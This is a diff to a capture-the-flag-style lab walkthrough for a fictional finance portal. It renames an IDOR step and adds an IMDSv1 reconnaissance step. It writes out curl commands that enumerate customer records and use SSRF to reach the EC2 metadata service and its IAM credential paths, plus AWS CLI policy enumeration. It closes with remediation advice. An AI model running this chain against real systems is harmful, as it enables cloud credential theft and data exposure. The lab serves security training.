@@ -1,4 +1,4 @@
-# legacy-bridge - Walkthrough
+# Legacy Bridge - Walkthrough
 
 ## Step 1: Reconnaissance
 
@@ -45,16 +45,16 @@ The document lookup is working normally.
 
 ---
 
-## Step 3: Discover Vulnerability — IDOR
+## Step 3: Discover Vulnerability — Unauthenticated Endpoint
 
-Test sequential document ID enumeration to check for IDOR.
+Test sequential document ID enumeration on the unauthenticated endpoint.
 
 ### Method 1: Using Browser
 1. Enter numbers 1 through 12 sequentially in the Document number field
 2. Click **Look up** for each
 3. Confirm you can access all customers' data without authorization
 
-![IDOR Enumeration](./assets/image/legacy-bridge-idor-enumeration.png)
+![Endpoint Enumeration](./assets/image/legacy-bridge-idor-enumeration.png)
 
 The response leaks a backend error revealing an internal hostname:
 
@@ -70,7 +70,7 @@ for i in {1..12}; do
 done
 ```
 
-**IDOR confirmed.** By incrementing `file_id`, any customer record is accessible. The `internal_source` field also exposes the internal backend hostname `internal-media-cdn.legacy`.
+**Unauthenticated access confirmed.** By incrementing `file_id`, any customer record is accessible. The `internal_source` field also exposes the internal backend hostname `internal-media-cdn.legacy`.
 
 ---
 
@@ -96,9 +96,32 @@ curl -s "$GW/api/v5/legacy/media-info?file_id=1&source=http://example.com"
 
 ---
 
-## Step 5: SSRF → Extract IAM Role Name via IMDSv1
+## Step 5: SSRF → IMDSv1 Reconnaissance
 
-Use the SSRF to query the EC2 Instance Metadata Service (IMDS) and enumerate available IAM roles.
+SSRF is confirmed. The next question: does the backend EC2 instance have IMDSv1 enabled? IMDSv1 requires no token — a plain GET to `169.254.169.254` succeeds if `http_tokens = "optional"`.
+
+First, confirm IMDSv1 is accessible and enumerate available metadata paths:
+
+```bash
+GW=http://<gateway-ip>
+curl -s "$GW/api/v5/legacy/media-info?file_id=1&source=http://169.254.169.254/latest/meta-data/"
+```
+
+Output:
+```
+ami-id
+hostname
+iam/
+instance-id
+instance-type
+local-ipv4
+placement/
+...
+```
+
+IMDSv1 is live. The `iam/` path confirms an IAM role is attached — credentials are available.
+
+Enumerate the attached IAM role name:
 
 ### Method 1: Using Browser
 1. Enter `1` in the Document number field
@@ -114,7 +137,6 @@ Use the SSRF to query the EC2 Instance Metadata Service (IMDS) and enumerate ava
 
 ### Method 2: Using CLI
 ```bash
-GW=http://<gateway-ip>
 curl -s "$GW/api/v5/legacy/media-info?file_id=1&source=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
 ```
 
@@ -266,16 +288,22 @@ Output:
 **S3 read access to the PII vault bucket confirmed.**
 
 ```bash
-# Check attached managed policies
 aws iam list-attached-role-policies --role-name $ROLE_NAME
 ```
 
 Output:
 ```json
-{ "AttachedPolicies": [] }
+{
+    "AttachedPolicies": [
+        {
+            "PolicyName": "AmazonSSMManagedInstanceCore",
+            "PolicyArn": "arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore"
+        }
+    ]
+}
 ```
 
-No managed policies attached. Only the inline policy is in use.
+`AmazonSSMManagedInstanceCore` confirms this is an EC2 instance role — SSM is used for instance management, not attacker-accessible from outside. All exploitable permissions are in the inline policy above.
 
 ---
 
@@ -337,7 +365,7 @@ The flag is included in the output.
 
 ```
 1. Beaver Finance Customer Portal (v5.0)
-   ↓ IDOR via file_id parameter — sequential enumeration
+   ↓ Unauthenticated file_id enumeration — internal hostname disclosed
 2. Customer Data Leak
    ↓ internal_source field exposes backend hostname (internal-media-cdn.legacy)
 3. SSRF via source parameter
@@ -363,7 +391,7 @@ The flag is included in the output.
 
 ## Key Techniques
 
-### IDOR Parameter Manipulation
+### Unauthenticated Endpoint Enumeration
 ```bash
 for i in {1..12}; do
   curl -s "$GW/api/v5/legacy/media-info?file_id=$i"
@@ -407,7 +435,7 @@ The Shadow API EC2 uses `http_tokens = "optional"`, making it directly exploitab
 - Scope IAM permissions to specific resource ARNs, not wildcard patterns
 
 ### 4. Defense in Depth
-- Use AWS WAF to detect IDOR and SSRF patterns
+- Use AWS WAF to detect SSRF patterns and block requests to RFC-1918 ranges
 - Enable CloudTrail logging for all S3 and IAM API calls
 - Use GuardDuty to detect credential misuse and anomalous API activity
 
